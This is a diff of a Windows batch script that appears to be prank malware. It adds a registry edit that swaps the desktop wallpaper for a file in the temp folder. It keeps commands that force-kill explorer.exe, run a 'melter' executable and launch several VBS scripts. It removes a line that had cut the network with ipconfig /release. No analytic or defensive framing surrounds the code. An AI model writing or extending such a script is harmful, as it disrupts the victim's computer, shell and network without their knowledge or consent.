@@ -1,10 +1,9 @@
 @echo off
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "%temp%\version.bmp" /F
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
 start parle.vbs
 timeout /T 20 /NOBREAK>nul
-ipconfig /release
-start dd.vbs
 taskkill /f /im explorer.exe
-start ptdr.vbs
 start melter.exe
 start musicstart.vbs
 start ZIZI.vbs
